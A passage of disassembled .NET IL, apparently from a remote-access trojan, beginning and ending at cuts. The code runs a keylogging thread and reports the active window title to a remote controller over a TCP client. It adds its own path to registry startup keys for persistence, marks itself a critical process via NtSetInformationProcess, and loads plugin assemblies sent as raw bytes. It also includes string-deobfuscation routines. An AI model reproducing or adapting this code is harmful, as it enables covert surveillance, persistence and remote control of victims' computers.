                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_00e9:  pop
    IL_00ea:  nop
    .try
    {
      IL_00eb:  newobj     instance void j.kl::.ctor()
      IL_00f0:  stsfld     class j.kl j.OK::kq
      IL_00f5:  ldsfld     class j.kl j.OK::kq
      IL_00fa:  dup
      IL_00fb:  ldvirtftn  instance void j.kl::WRK()
      IL_0101:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0106:  ldc.i4.1
      IL_0107:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_010c:  stloc.s    V_6
      IL_010e:  ldloc.s    V_6
      IL_0110:  ldnull
      IL_0111:  ldstr      "Start"
      IL_0116:  ldc.i4.0
      IL_0117:  newarr     [mscorlib]System.Object
      IL_011c:  ldnull
      IL_011d:  ldnull
      IL_011e:  ldnull
      IL_011f:  ldc.i4.1
      IL_0120:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0125:  pop
      IL_0126:  leave.s    IL_014a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0128:  dup
      IL_0129:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012e:  stloc.s    V_8
      IL_0130:  nop
      IL_0131:  ldloc.s    V_8
      IL_0133:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0138:  nop
      IL_0139:  ldloc.s    V_8
      IL_013b:  stloc.s    V_7
      IL_013d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0142:  nop
      IL_0143:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0148:  leave.s    IL_014a

    }  // end handler
    IL_014a:  nop
    IL_014b:  ldc.i4.0
    IL_014c:  stloc.1
    IL_014d:  ldstr      ""
    IL_0152:  stloc.2
    IL_0153:  ldsfld     bool j.OK::BD
    IL_0158:  stloc.s    V_21
    IL_015a:  ldloc.s    V_21
    IL_015c:  brfalse.s  IL_019d

    IL_015e:  nop
    .try
    {
      IL_015f:  ldnull
      IL_0160:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0166:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_016b:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_0170:  nop
      IL_0171:  ldc.i4.1
      IL_0172:  call       void j.OK::pr(int32)
      IL_0177:  nop
      IL_0178:  leave.s    IL_019c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_017a:  dup
      IL_017b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0180:  stloc.s    V_10
      IL_0182:  nop
      IL_0183:  ldloc.s    V_10
      IL_0185:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_018a:  nop
      IL_018b:  ldloc.s    V_10
      IL_018d:  stloc.s    V_9
      IL_018f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0194:  nop
      IL_0195:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_019a:  leave.s    IL_019c

    }  // end handler
    IL_019c:  nop
    IL_019d:  nop
    IL_019e:  br         IL_0408

    IL_01a3:  ldc.i4     0x3e8
    IL_01a8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01ad:  nop
    IL_01ae:  ldsfld     bool j.OK::Cn
    IL_01b3:  ldc.i4.0
    IL_01b4:  ceq
    IL_01b6:  stloc.s    V_21
    IL_01b8:  ldloc.s    V_21
    IL_01ba:  brfalse.s  IL_01c2

    IL_01bc:  ldstr      ""
    IL_01c1:  stloc.2
    IL_01c2:  nop
    IL_01c3:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_01c8:  nop
    IL_01c9:  nop
    .try
    {
      IL_01ca:  ldloc.1
      IL_01cb:  ldc.i4.1
      IL_01cc:  add.ovf
      IL_01cd:  stloc.1
      IL_01ce:  ldloc.1
      IL_01cf:  ldc.i4.5
      IL_01d0:  ceq
      IL_01d2:  stloc.s    V_21
      IL_01d4:  ldloc.s    V_21
      IL_01d6:  brfalse.s  IL_0213

      IL_01d8:  nop
      .try
      {
        IL_01d9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01de:  ldc.i4     0x400
        IL_01e3:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01e8:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01ed:  nop
        IL_01ee:  leave.s    IL_0212

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01f0:  dup
        IL_01f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01f6:  stloc.s    V_11
        IL_01f8:  nop
        IL_01f9:  ldloc.s    V_11
        IL_01fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0200:  nop
        IL_0201:  ldloc.s    V_11
        IL_0203:  stloc.s    V_12
        IL_0205:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_020a:  nop
        IL_020b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0210:  leave.s    IL_0212

      }  // end handler
      IL_0212:  nop
      IL_0213:  nop
      IL_0214:  ldloc.1
      IL_0215:  ldc.i4.8
      IL_0216:  clt
      IL_0218:  ldc.i4.0
      IL_0219:  ceq
      IL_021b:  stloc.s    V_21
      IL_021d:  ldloc.s    V_21
      IL_021f:  brfalse.s  IL_025a

      IL_0221:  ldc.i4.0
      IL_0222:  stloc.1
      IL_0223:  call       string j.OK::ACT()
      IL_0228:  stloc.s    V_13
      IL_022a:  ldloc.2
      IL_022b:  ldloc.s    V_13
      IL_022d:  ldc.i4.0
      IL_022e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0233:  ldc.i4.0
      IL_0234:  ceq
      IL_0236:  ldc.i4.0
      IL_0237:  ceq
      IL_0239:  stloc.s    V_21
      IL_023b:  ldloc.s    V_21
      IL_023d:  brfalse.s  IL_0259

      IL_023f:  ldloc.s    V_13
      IL_0241:  stloc.2
      IL_0242:  ldstr      "act"
      IL_0247:  ldsfld     string j.OK::Y
      IL_024c:  ldloc.s    V_13
      IL_024e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0253:  call       bool j.OK::Send(string)
      IL_0258:  pop
      IL_0259:  nop
      IL_025a:  nop
      IL_025b:  ldsfld     bool j.OK::Isu
      IL_0260:  stloc.s    V_21
      IL_0262:  ldloc.s    V_21
      IL_0264:  brfalse    IL_03e1

      IL_0269:  nop
      .try
      {
        IL_026a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_026f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0274:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0279:  ldsfld     string j.OK::sf
        IL_027e:  ldstr      "\\"
        IL_0283:  ldsfld     string j.OK::RG
        IL_0288:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_028d:  ldstr      ""
        IL_0292:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0297:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_029c:  ldstr      "\""
        IL_02a1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02a6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02ab:  ldstr      "\" .."
        IL_02b0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02b5:  ldc.i4.0
        IL_02b6:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02bb:  stloc.s    V_22
        IL_02bd:  ldloc.s    V_22
        IL_02bf:  brfalse.s  IL_02ff

        IL_02c1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02c6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02cb:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02d0:  ldsfld     string j.OK::sf
        IL_02d5:  ldc.i4.1
        IL_02d6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02db:  ldsfld     string j.OK::RG
        IL_02e0:  ldstr      "\""
        IL_02e5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ea:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02ef:  ldstr      "\" .."
        IL_02f4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02f9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02fe:  nop
        IL_02ff:  nop
        IL_0300:  leave.s    IL_0324

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0302:  dup
        IL_0303:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0308:  stloc.s    V_14
        IL_030a:  nop
        IL_030b:  ldloc.s    V_14
        IL_030d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0312:  nop
        IL_0313:  ldloc.s    V_14
        IL_0315:  stloc.s    V_15
        IL_0317:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_031c:  nop
        IL_031d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0322:  leave.s    IL_0324

      }  // end handler
      IL_0324:  nop
      IL_0325:  nop
      .try
      {
        IL_0326:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_032b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0330:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0335:  ldsfld     string j.OK::sf
        IL_033a:  ldstr      "\\"
        IL_033f:  ldsfld     string j.OK::RG
        IL_0344:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0349:  ldstr      ""
        IL_034e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0353:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0358:  ldstr      "\""
        IL_035d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0362:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0367:  ldstr      "\" .."
        IL_036c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0371:  ldc.i4.0
        IL_0372:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0377:  stloc.s    V_22
        IL_0379:  ldloc.s    V_22
        IL_037b:  brfalse.s  IL_03bb

        IL_037d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0382:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0387:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_038c:  ldsfld     string j.OK::sf
        IL_0391:  ldc.i4.1
        IL_0392:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0397:  ldsfld     string j.OK::RG
        IL_039c:  ldstr      "\""
        IL_03a1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_03a6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_03ab:  ldstr      "\" .."
        IL_03b0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_03b5:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_03ba:  nop
        IL_03bb:  nop
        IL_03bc:  leave.s    IL_03e0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03be:  dup
        IL_03bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03c4:  stloc.s    V_16
        IL_03c6:  nop
        IL_03c7:  ldloc.s    V_16
        IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03ce:  nop
        IL_03cf:  ldloc.s    V_16
        IL_03d1:  stloc.s    V_17
        IL_03d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03d8:  nop
        IL_03d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03de:  leave.s    IL_03e0

      }  // end handler
      IL_03e0:  nop
      IL_03e1:  nop
      IL_03e2:  leave.s    IL_0406

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03e4:  dup
      IL_03e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03ea:  stloc.s    V_18
      IL_03ec:  nop
      IL_03ed:  ldloc.s    V_18
      IL_03ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03f4:  nop
      IL_03f5:  ldloc.s    V_18
      IL_03f7:  stloc.s    V_19
      IL_03f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03fe:  nop
      IL_03ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0404:  leave.s    IL_0406

    }  // end handler
    IL_0406:  nop
    IL_0407:  nop
    IL_0408:  ldc.i4.1
    IL_0409:  stloc.s    V_22
    IL_040b:  ldloc.s    V_22
    IL_040d:  brtrue     IL_01a3

    IL_0412:  nop
    IL_0413:  ret
  } // end of method OK::ko

  .method public static string  betch(string Kalari) cil managed
  {
    // Code size       100 (0x64)
    .maxstack  2
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             string V_6,
             int32 V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldnull
    IL_0002:  stloc.1
    IL_0003:  ldarg.0
    IL_0004:  stloc.s    V_6
    IL_0006:  ldc.i4.0
    IL_0007:  stloc.s    V_5
    IL_0009:  ldloc.s    V_6
    IL_000b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0010:  stloc.s    V_7
    IL_0012:  br.s       IL_0052

    IL_0014:  ldloc.s    V_6
    IL_0016:  ldloc.s    V_5
    IL_0018:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0022:  stloc.3
    IL_0023:  ldloc.3
    IL_0024:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::AscW(string)
    IL_0029:  ldc.i4     0x1f40
    IL_002e:  sub.ovf
    IL_002f:  stloc.s    V_4
    IL_0031:  ldloc.s    V_4
    IL_0033:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
    IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_003d:  stloc.2
    IL_003e:  ldloc.1
    IL_003f:  ldloc.2
    IL_0040:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
    IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004a:  stloc.1
    IL_004b:  ldloc.s    V_5
    IL_004d:  ldc.i4.1
    IL_004e:  add.ovf
    IL_004f:  stloc.s    V_5
    IL_0051:  nop
    IL_0052:  ldloc.s    V_5
    IL_0054:  ldloc.s    V_7
    IL_0056:  clt
    IL_0058:  stloc.s    V_8
    IL_005a:  ldloc.s    V_8
    IL_005c:  brtrue.s   IL_0014

    IL_005e:  ldloc.1
    IL_005f:  stloc.0
    IL_0060:  br.s       IL_0062

    IL_0062:  ldloc.0
    IL_0063:  ret
  } // end of method OK::betch

  .method public static string  vpn(string Kalari) cil managed
  {
    // Code size       90 (0x5a)
    .maxstack  2
    .locals init (int32 V_0,
             int32 V_1,
             string V_2,
             string V_3,
             string V_4,
             int32 V_5,
             string V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldnull
    IL_0002:  stloc.2
    IL_0003:  ldarg.0
    IL_0004:  stloc.3
    IL_0005:  ldc.i4.0
    IL_0006:  stloc.1
    IL_0007:  ldloc.3
    IL_0008:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0048

    IL_0010:  ldloc.3
    IL_0011:  ldloc.1
    IL_0012:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0017:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_001c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::AscW(string)
    IL_0021:  ldc.i4.2
    IL_0022:  sub.ovf
    IL_0023:  ldc.i4.1
    IL_0024:  sub.ovf
    IL_0025:  stloc.s    V_5
    IL_0027:  ldloc.s    V_5
    IL_0029:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
    IL_002e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0033:  stloc.s    V_6
    IL_0035:  ldloc.2
    IL_0036:  ldloc.s    V_6
    IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
    IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0042:  stloc.2
    IL_0043:  ldloc.1
    IL_0044:  ldc.i4.1
    IL_0045:  add.ovf
    IL_0046:  stloc.1
    IL_0047:  nop
    IL_0048:  ldloc.1
    IL_0049:  ldloc.0
    IL_004a:  clt
    IL_004c:  stloc.s    V_7
    IL_004e:  ldloc.s    V_7
    IL_0050:  brtrue.s   IL_0010

    IL_0052:  ldloc.2
    IL_0053:  stloc.s    V_4
    IL_0055:  br.s       IL_0057

    IL_0057:  ldloc.s    V_4
    IL_0059:  ret
  } // end of method OK::vpn

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             string V_2,
             int32 V_3,
             uint8[] V_4,
             bool V_5)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    B
    IL_000e:  ldstr      ""
    IL_0013:  stloc.2
    IL_0014:  ldarg.0
    IL_0015:  stloc.s    V_4
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.3
    IL_0019:  br.s       IL_0038

    IL_001b:  ldloc.s    V_4
    IL_001d:  ldloc.3
    IL_001e:  ldelem.u1
    IL_001f:  stloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldloca.s   V_1
    IL_0023:  ldstr      "x2"
    IL_0028:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0032:  stloc.2
    IL_0033:  ldloc.3
    IL_0034:  ldc.i4.1
    IL_0035:  add.ovf
    IL_0036:  stloc.3
    IL_0037:  nop
    IL_0038:  ldloc.3
    IL_0039:  ldloc.s    V_4
    IL_003b:  ldlen
    IL_003c:  conv.ovf.i4
    IL_003d:  clt
    IL_003f:  stloc.s    V_5
    IL_0041:  ldloc.s    V_5
    IL_0043:  brtrue.s   IL_001b

    IL_0045:  ldloc.2
    IL_0046:  stloc.0
    IL_0047:  br.s       IL_0049

    IL_0049:  ldloc.0
    IL_004a:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       136 (0x88)
    .maxstack  3
    .locals init (class [mscorlib]System.Reflection.Module V_0,
             object V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0007:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000c:  stloc.s    V_4
    IL_000e:  ldc.i4.0
    IL_000f:  stloc.3
    IL_0010:  br.s       IL_0075

    IL_0012:  ldloc.s    V_4
    IL_0014:  ldloc.3
    IL_0015:  ldelem.ref
    IL_0016:  stloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001d:  stloc.s    V_6
    IL_001f:  ldc.i4.0
    IL_0020:  stloc.s    V_5
    IL_0022:  br.s       IL_0062

    IL_0024:  ldloc.s    V_6
    IL_0026:  ldloc.s    V_5
    IL_0028:  ldelem.ref
    IL_0029:  stloc.2
    IL_002a:  ldloc.2
    IL_002b:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0030:  ldstr      "."
    IL_0035:  ldarg.1
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_0040:  stloc.s    V_7
    IL_0042:  ldloc.s    V_7
    IL_0044:  brfalse.s  IL_005a

    IL_0046:  ldloc.0
    IL_0047:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_004c:  ldloc.2
    IL_004d:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0052:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0057:  stloc.1
    IL_0058:  br.s       IL_0086

    IL_005a:  nop
    IL_005b:  ldloc.s    V_5
    IL_005d:  ldc.i4.1
    IL_005e:  add.ovf
    IL_005f:  stloc.s    V_5
    IL_0061:  nop
    IL_0062:  ldloc.s    V_5
    IL_0064:  ldloc.s    V_6
    IL_0066:  ldlen
    IL_0067:  conv.ovf.i4
    IL_0068:  clt
    IL_006a:  stloc.s    V_7
    IL_006c:  ldloc.s    V_7
    IL_006e:  brtrue.s   IL_0024

    IL_0070:  ldloc.3
    IL_0071:  ldc.i4.1
    IL_0072:  add.ovf
    IL_0073:  stloc.3
    IL_0074:  nop
    IL_0075:  ldloc.3
    IL_0076:  ldloc.s    V_4
    IL_0078:  ldlen
    IL_0079:  conv.ovf.i4
    IL_007a:  clt
    IL_007c:  stloc.s    V_7
    IL_007e:  ldloc.s    V_7
    IL_0080:  brtrue.s   IL_0012

    IL_0082:  ldnull
    IL_0083:  stloc.1
    IL_0084:  br.s       IL_0086

    IL_0086:  ldloc.1
    IL_0087:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       58 (0x3a)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0007:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000c:  ldc.i4.s   29
      IL_000e:  ldarga.s   i
      IL_0010:  ldc.i4.4
      IL_0011:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0016:  pop
      IL_0017:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  dup
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  stloc.1
      IL_0020:  nop
      IL_0021:  ldloc.1
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  nop
      IL_0028:  ldloc.1
      IL_0029:  stloc.0
      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002f:  nop
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  nop
    IL_0038:  nop
    IL_0039:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       742 (0x2e6)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             int64 V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             int32 V_11,
             char V_12,
             bool V_13,
             bool V_14,
             int32 V_15)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  nop
    IL_0003:  ldstr      ""
    IL_0008:  stsfld     string j.OK::lastcap
    IL_000d:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0012:  ldnull
    IL_0013:  ceq
    IL_0015:  ldc.i4.0
    IL_0016:  ceq
    IL_0018:  stloc.s    V_13
    IL_001a:  ldloc.s    V_13
    IL_001c:  brfalse    IL_0261

    IL_0021:  ldc.i4.m1
    IL_0022:  conv.i8
    IL_0023:  stloc.0
    IL_0024:  ldc.i4.0
    IL_0025:  stloc.1
    IL_0026:  nop
    .try
    {
      IL_0027:  nop
      IL_0028:  nop
      IL_0029:  ldloc.1
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.1
      IL_002d:  ldloc.1
      IL_002e:  ldc.i4.s   10
      IL_0030:  ceq
      IL_0032:  stloc.s    V_13
      IL_0034:  ldloc.s    V_13
      IL_0036:  brfalse.s  IL_0041

      IL_0038:  ldc.i4.0
      IL_0039:  stloc.1
      IL_003a:  ldc.i4.1
      IL_003b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0040:  nop
      IL_0041:  nop
      IL_0042:  ldsfld     bool j.OK::Cn
      IL_0047:  ldc.i4.0
      IL_0048:  ceq
